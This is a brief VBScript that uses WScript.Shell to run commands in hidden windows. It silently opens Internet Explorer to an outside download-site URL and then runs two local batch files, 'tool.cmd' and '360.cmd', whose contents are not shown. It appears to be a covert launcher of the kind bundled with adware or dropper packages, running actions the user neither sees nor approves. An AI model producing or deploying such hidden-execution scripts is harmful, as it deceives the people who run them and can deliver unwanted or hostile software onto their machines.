DIM objShell
set objShell=Wscript.createObject("wscript.shell")
iReturn=objShell.Run("cmd.exe /C start /min       iexplore http://www.dao234.com/index2.html?aixiazai", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\tool.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\360.cmd", 0, TRUE)
